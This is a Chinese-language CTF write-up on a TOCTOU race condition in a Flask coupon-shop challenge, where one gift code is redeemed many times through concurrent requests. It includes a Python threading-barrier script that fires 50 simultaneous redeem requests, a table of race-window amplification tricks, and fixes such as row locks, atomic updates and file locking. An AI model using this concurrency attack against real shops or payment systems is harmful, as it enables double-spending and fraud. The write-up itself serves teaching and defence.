## 题目背景

Note

CouponShop 优惠券商城（Flask + Werkzeug，线程模式）：

- 一张兑换码 `GIFT10`：正常流程下 只能用一次，+¥10

## 漏洞本质

TOCTOU（Time-of-Check to Time-of-Use）是 `OWASP A04: Insecure Design` 与 `CWE-362: Concurrent Execution using Shared Resource with Improper Synchronization` 的核心子类，也称为 Race Condition。

本题代码骨架（简化）：

[代码块边界]python
1  state = read_state()                 # [无法识别] Check: 读文件
2  if state['codes'][code]:             # [无法识别] 检查 used 标志
3      return already_used
4  time.sleep(0.15)                     # [无法识别] Race Window（故意放大）
5  state = read_state()                 # [无法识别] Use: 读最新 state
6  state['balance'] += 10               # 累加
7  state['codes'][code] = True          # 标记 used
8  save_state(state)                    # 落盘
[代码块边界]

\

时间轴（N 条线程并发）：

[代码块边界]text
1  T=0.00   T1 读文件    codes.GIFT10=False   ✓
2  T=0.00   T2 读文件    codes.GIFT10=False   ✓   ← 仍是 False，因为谁都还没写
3  T=0.00   T3 读文件    codes.GIFT10=False   ✓
4  ...
5           （共 N 个线程全部通过 already_used 检查）
6           ———————— Race Window: sleep 0.15s ————————
7  T=0.15   T1 读 state → balance=0   → +10  → write balance=10, used=True
8  T=0.15+  T2 读 state → balance=10  → +10  → write balance=20
9  ...
10 T=0.15+  T13 读 state → balance=120 → +10 → write balance=130  ← 爆
[代码块边界]

修复的"五大银弹"（按强度排序）：

1. 数据库 `SELECT ... FOR UPDATE` / 行锁
2. 原子 `UPDATE + WHERE` 条件（`UPDATE WHERE used=false`，rowcount=0 视为已用）
3. 乐观锁 / CAS（version 字段 + 条件 update）
4. 分布式锁（Redis SETNX + 过期时间; Zookeeper; Etcd）
5. 队列化 / 单线程处理（把请求放入队列串行执行，MQ 消费端单 worker）

文件锁（`fcntl.flock`）能否救场：可以，但必须从 `read` 开始加锁直到 `write` 完成才有效；只在 `write` 阶段加锁，依然会丢 `read` 时刻的值。

Important

💡 本题一句话心智模型：

"任何涉及「检查资源状态 -> 修改资源状态」的业务，必须保证 `check` 和 `use` 在同一原子操作/事务内"` 中间只要有 `sleep` / IO / RPC / 跨文件读写，就打开了 race window。

关键前置知识

Race window 放大技巧【攻击侧】：

| 技巧 | 作用 | 本题 |
| --- | --- | --- |
| HTTP Pipelining | 一个 TCP 包发多个请求 | 有效 |
| HTTP/2 Single-Packet Attack (James Kettle 2023) | 一个 TCP 包 ≤1 RTT 发数百请求 | Turbo Intruder |
| Barrier 同步 | 所有线程在 `barrier.wait()` 同时放行 | 本题使用 |
| 慢读/慢写 | 让后端等 IO 时切换线程 | 无需 |
| Gzip/压缩延迟 | 被触发解压时切换 | 无需 |
| 长 URL / 大 body | 后端解析慢 | 无需 |
| 文件/DNS 慢查询 | 后端 sleep 等响应 | 本题天然有 `time.sleep(0.15)` |

并发并行的 3 层区别：

- 并发（Concurrent）：任务交错执行（单核也可）→ 本题的真实情况（GIL 下）
- 并行（Parallel）：真多核同时执行 → race 更激烈
- 分布式（Distributed）：跨机器，需分布式锁

## Step 4 · Python barrier 对齐并发

[代码块边界]python
import threading, requests
B = "http://192.168.1.100:32818"
N = 50
requests.get(B + "/reset")
bar = threading.Barrier(N)

def hit():
    bar.wait()            # 所有线程在此等齐
    requests.post(B + "/redeem", data={"code": "GIFT10"})

ts = [threading.Thread(target=hit) for _ in range(N)]
for t in ts: t.start()
for t in ts: t.join()
[代码块边界]

barrier.wait() 让 50 条线程同时起跑，最大化 race window 内并发数。

## 常见坑

| 问题 | 根因 | 解决 |
|---|---|---|
| 50 并发全部 already_used | 线程逐个启动，前一条已写 used=True | 用 threading.Barrier 同步对齐 |
| 50 并发只 1 条 ok balance=10 | race window 太小 / 并发未真正在并行 | 增大 sleep 时延 / 更多线程 / 更快发包 |
| 响应全部 500 Internal Server Error | 文件 IO race 导致 JSON 损坏 | 降低并发 / 多次尝试 |
| balance 确实累加但 < 100 | 通过 check 的线程数不够 | 提高 N（从 50 到 200） |
| xargs -P 50 在 macOS 无效 | macOS xargs 不支持 -P 参数 | 用 parallel 或 Python |
| reset 后状态没重置 | 文件 IO 没 flush | 加 sleep 0.5 缓冲 |
| /buy 成功但 balance 变负 | 设计如此（balance -= 100） | 正常，flag 已返 |

## 条件竞争进阶 10 谱

Important

1. TOCTOU（本题）：check-use 非原子
2. 双花攻击：同一笔钱 / token 用两次
3. 负库存：并发下单导致库存负数
4. 限量券多领：一人同时抢多张
5. 配额绕过：每日限额同时到达
6. 锁丢失：分布式锁过期 / 网络分区
7. ABA 问题：状态 A->B->A 看似未变但实际改过
8. 内核 race（UAF、double-free）：底层漏洞
9. 文件 TOCTOU：check file -> open file 之间被替换为 symlink
10. 验证 race：同一 session 并发 OTP 校验

def redeem():

        fcntl.flock(f, fcntl.LOCK_EX)      # 独占锁，阻塞等待
        state = json.load(f)
        if state['codes'][code]: return already_used
        state['balance'] += 10
        state['codes'][code] = True
        f.seek(0); f.truncate()
        json.dump(state, f)

- 把 redeem 请求进入 MQ（Kafka、RabbitMQ）
- 消费端单 worker 串行处理

- 客户端生成 `request_id`，服务端去重（同一 `request_id` 同结果）
